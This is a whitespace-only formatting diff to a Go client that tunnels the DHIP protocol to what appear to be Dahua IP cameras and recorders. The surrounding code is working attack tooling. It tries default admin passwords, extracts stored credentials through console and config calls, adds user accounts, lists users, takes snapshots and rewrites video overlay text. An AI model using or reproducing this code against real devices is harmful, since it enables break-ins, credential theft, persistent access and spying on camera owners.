@@ -22,12 +22,12 @@ type PTCPTunnel struct {
 	client   *DHClient
 	realm    uint32
 	recvBufs map[uint32][]byte
-	conn     *net.UDPConn 
-	addr     string       
-	session  *PTCPSession 
-	user     string       
-	pass     string       
-	sendMu   sync.Mutex   
+	conn     *net.UDPConn
+	addr     string
+	session  *PTCPSession
+	user     string
+	pass     string
+	sendMu   sync.Mutex
 }
 
 func newTunnel(c *DHClient, conn *net.UDPConn, addr string, session *PTCPSession) *PTCPTunnel {
@@ -58,7 +58,9 @@ func (t *PTCPTunnel) readOneDataForRealm(realm uint32, timeout time.Duration) ([
 			return nil, fmt.Errorf("read: %w", err)
 		}
 		pkt, pErr := ParsePTCPPacket(buf[:n])
-		if pErr != nil { continue }
+		if pErr != nil {
+			continue
+		}
 		t.session.Receive(pkt)
 
 		if len(pkt.Body) == 0 {
@@ -77,7 +79,9 @@ func (t *PTCPTunnel) readOneDataForRealm(realm uint32, timeout time.Duration) ([
 		}
 		if bt == 0x10 || (bt&0xF0) == 0x10 {
 			r, payload, pErr := ParsePayloadBody(pkt.Body)
-			if pErr != nil { continue }
+			if pErr != nil {
+				continue
+			}
 			if r != realm {
 				t.recvBufs[r] = append(t.recvBufs[r], payload...)
 				t.sendACK()
@@ -159,7 +163,7 @@ func (t *PTCPTunnel) ReadData(timeout time.Duration) ([]byte, error) {
 					t.sendACK()
 					continue
 				}
-				t.sendACK() 
+				t.sendACK()
 				if len(out) > 0 {
 					return out, nil
 				}
@@ -175,12 +179,16 @@ func (t *PTCPTunnel) ReadData(timeout time.Duration) ([]byte, error) {
 		if bt == 0x10 || (bt&0xF0) == 0x10 {
 			realm, payload, err := ParsePayloadBody(pkt.Body)
 			if err != nil {
-				if ackNow { t.sendACK() }
+				if ackNow {
+					t.sendACK()
+				}
 				continue
 			}
 			if realm != t.realm {
 				t.recvBufs[realm] = append(t.recvBufs[realm], payload...)
-				if ackNow { t.sendACK() }
+				if ackNow {
+					t.sendACK()
+				}
 				continue
 			}
 			t.sendACK()
@@ -189,7 +197,9 @@ func (t *PTCPTunnel) ReadData(timeout time.Duration) ([]byte, error) {
 			continue
 		}
 
-		if ackNow { t.sendACK() }
+		if ackNow {
+			t.sendACK()
+		}
 	}
 }
 
@@ -269,7 +279,7 @@ func (t *PTCPTunnel) doBindWithTarget(realm uint32, target string) error {
 					return nil
 				}
 			} else {
-				return nil 
+				return nil
 			}
 		}
 	}
@@ -402,7 +412,7 @@ func (t *PTCPTunnel) DoHTTP(req []byte, timeout time.Duration) ([]byte, error) {
 
 func selectAuthHeader(reqStr string, authHeaders []string, user, pass string) string {
 	selected := ""
-	priority := 0 
+	priority := 0
 	for _, h := range authHeaders {
 		var p int
 		switch {
@@ -618,12 +628,9 @@ func (t *PTCPTunnel) DoHTTPOnRealm(realm uint32, req []byte, timeout time.Durati
 			continue
 		}
 
-		
 		continue
 	}
 }
-
-
 
 type DHIPClient struct {
 	tunnel *PTCPTunnel
@@ -632,7 +639,6 @@ type DHIPClient struct {
 }
 
 var dhipMagic = []byte{0x20, 0x00, 0x00, 0x00, 0x44, 0x48, 0x49, 0x50}
-
 
 func (t *PTCPTunnel) NewDHIPClient() (*DHIPClient, error) {
 	realm := rand.Uint32()
@@ -645,7 +651,6 @@ func (t *PTCPTunnel) NewDHIPClient() (*DHIPClient, error) {
 func (c *DHIPClient) Close() {
 	c.tunnel.DisconnectRealm(c.realm)
 }
-
 
 func (c *DHIPClient) send(method string, params any, id int, object any) error {
 	body := map[string]any{
@@ -669,10 +674,8 @@ func (c *DHIPClient) send(method string, params any, id int, object any) error {
 	return c.tunnel.SendDataWithRealm(append(hdr, raw...), c.realm)
 }
 
-
 func (c *DHIPClient) readPacket(timeout time.Duration) (map[string]any, error) {
-	
-	
+
 	data, err := c.readBytes(32, timeout)
 	if err != nil {
 		return nil, fmt.Errorf("dhip read header: %w", err)
@@ -695,7 +698,6 @@ func (c *DHIPClient) readPacket(timeout time.Duration) (map[string]any, error) {
 	return pkt, nil
 }
 
-
 func (c *DHIPClient) readBytes(n int, timeout time.Duration) ([]byte, error) {
 	out := make([]byte, 0, n)
 	deadline := time.Now().Add(timeout)
@@ -706,16 +708,13 @@ func (c *DHIPClient) readBytes(n int, timeout time.Duration) ([]byte, error) {
 		}
 		out = append(out, chunk...)
 	}
-	
-	
+
 	if len(out) > n {
 		c.tunnel.recvBufs[c.realm] = append(out[n:], c.tunnel.recvBufs[c.realm]...)
 		out = out[:n]
 	}
 	return out, nil
 }
-
-
 
 func (c *DHIPClient) Call(method string, params any, id int, object any, notifies *[]map[string]any) (map[string]any, error) {
 	if err := c.send(method, params, id, object); err != nil {
@@ -736,10 +735,8 @@ func (c *DHIPClient) Call(method string, params any, id int, object any, notifie
 	}
 }
 
-
-
 func (c *DHIPClient) Login() error {
-	
+
 	r, err := c.Call("global.login", map[string]any{
 		"userName":      "admin",
 		"password":      "Not Used",
@@ -756,7 +753,6 @@ func (c *DHIPClient) Login() error {
 		return nil
 	}
 
-	
 	params, _ := r["params"].(map[string]any)
 	realm, _ := params["realm"].(string)
 	random, _ := params["random"].(string)
@@ -764,7 +760,7 @@ func (c *DHIPClient) Login() error {
 	c.sess = challengeSess
 
 	if realm != "" && random != "" {
-		
+
 		for _, pwd := range []string{"", "admin"} {
 			h1 := strings.ToUpper(md5Hex(fmt.Sprintf("admin:%s:%s", realm, pwd)))
 			h2 := strings.ToUpper(md5Hex(fmt.Sprintf("admin:%s:%s", random, h1)))
@@ -785,7 +781,6 @@ func (c *DHIPClient) Login() error {
 			}
 		}
 
-		
 		for _, pwd := range []string{"admin", ""} {
 			r3, err := c.Call("global.login", map[string]any{
 				"userName":      "admin",
@@ -808,8 +803,6 @@ func (c *DHIPClient) Login() error {
 
 	return fmt.Errorf("dhip: all login paths failed (realm=%s)", realm)
 }
-
-
 
 func (c *DHIPClient) ExtractCredsViaConsole() (string, string, bool) {
 	r, err := c.Call("console.factory.instance", nil, 4, nil, nil)
@@ -840,8 +833,6 @@ func (c *DHIPClient) ExtractCredsViaConsole() (string, string, bool) {
 	return "", "", false
 }
 
-
-
 func (c *DHIPClient) ExtractCredsViaConfig() (string, string, bool) {
 	r, err := c.Call("configManager.getConfig", map[string]any{"name": "RemoteDevice"}, 5, nil, nil)
 	if err != nil {
@@ -869,7 +860,6 @@ func (c *DHIPClient) ExtractCredsViaConfig() (string, string, bool) {
 	return "", "", false
 }
 
-
 func (c *DHIPClient) AddUserViaDHIP(userName, password, groupID string) error {
 	r, err := c.Call("userManager.addUser", map[string]any{
 		"user": map[string]any{
@@ -886,7 +876,6 @@ func (c *DHIPClient) AddUserViaDHIP(userName, password, groupID string) error {
 	}
 	return fmt.Errorf("addUser via DHIP: result false")
 }
-
 
 func parseOnvifNotifies(notifies []map[string]any) (string, string, bool) {
 	for _, n := range notifies {
@@ -907,12 +896,12 @@ func parseOnvifNotifies(notifies []map[string]any) (string, string, bool) {
 		if output == "" {
 			continue
 		}
-		
+
 		user, pass, ok := extractCredsFromJSON(output)
 		if ok {
 			return user, pass, true
 		}
-		
+
 		user, pass, ok = extractCredsFromLines(output)
 		if ok {
 			return user, pass, true
@@ -1009,7 +998,7 @@ func (t *PTCPTunnel) doHTTP(req []byte, timeout time.Duration) ([]byte, error) {
 
 		headerEnd := findHeaderEnd(fullResp)
 		if headerEnd < 0 {
-			continue 
+			continue
 		}
 
 		bodyLen := len(fullResp) - headerEnd
@@ -1019,7 +1008,7 @@ func (t *PTCPTunnel) doHTTP(req []byte, timeout time.Duration) ([]byte, error) {
 			if bodyLen >= cl {
 				return fullResp, nil
 			}
-			continue 
+			continue
 		}
 
 		bodyStr := string(fullResp[headerEnd:])
@@ -1248,7 +1237,6 @@ func (t *PTCPTunnel) Snapshot(channel int) ([]byte, error) {
 	return nil, fmt.Errorf("snapshot: %s body=%q", statusLine, bodyPreview)
 }
 
-
 func extractBody(resp []byte) []byte {
 	idx := findHeaderEnd(resp)
 	if idx < 0 {
@@ -1269,7 +1257,6 @@ func (t *PTCPTunnel) GetDeviceInfo() (model string, channels int, firmware strin
 		return m
 	}
 
-	
 	xmlTag := func(body []byte, tag string) string {
 		s := string(body)
 		open, close := "<"+tag+">", "</"+tag+">"
@@ -1288,7 +1275,7 @@ func (t *PTCPTunnel) GetDeviceInfo() (model string, channels int, firmware strin
 	}
 
 	type getResult struct {
-		resp []byte
+		resp    []byte
 		nvrPage bool
 	}
 	doGet := func(path string) getResult {
@@ -1324,7 +1311,7 @@ func (t *PTCPTunnel) GetDeviceInfo() (model string, channels int, firmware strin
 			model = m
 			break
 		}
-		
+
 		if m := xmlTag(body, "deviceType"); m != "" && !hasErrPrefix(m) {
 			model = m
 			break
@@ -1349,7 +1336,7 @@ func (t *PTCPTunnel) GetDeviceInfo() (model string, channels int, firmware strin
 			}
 			body := extractBody(r.resp)
 			if m := strings.TrimSpace(string(body)); m != "" && !hasErrPrefix(m) {
-				
+
 				if v := xmlTag(body, "type"); v != "" {
 					m = v
 				}
@@ -1427,7 +1414,7 @@ func (t *PTCPTunnel) GetUsers() ([]map[string]string, error) {
 		idxStr := line[len("users["):close]
 		var idx int
 		fmt.Sscanf(idxStr, "%d", &idx)
-		rest := line[close+2:] 
+		rest := line[close+2:]
 		k, v, ok := strings.Cut(rest, "=")
 		if !ok {
 			continue
@@ -1636,7 +1623,7 @@ func (t *PTCPTunnel) SetOverlayText(channel int, lines []string) error {
 		calls = append(calls, map[string]interface{}{
 			"method": "configManager.setConfig",
 			"params": map[string]interface{}{
-				fmt.Sprintf("VideoWidget[%d].CustomTitle[%d].Text", channel, i):        slotText,
+				fmt.Sprintf("VideoWidget[%d].CustomTitle[%d].Text", channel, i):         slotText,
 				fmt.Sprintf("VideoWidget[%d].CustomTitle[%d].EncodeBlend", channel, i):  blend,
 				fmt.Sprintf("VideoWidget[%d].CustomTitle[%d].PreviewBlend", channel, i): blend,
 			},
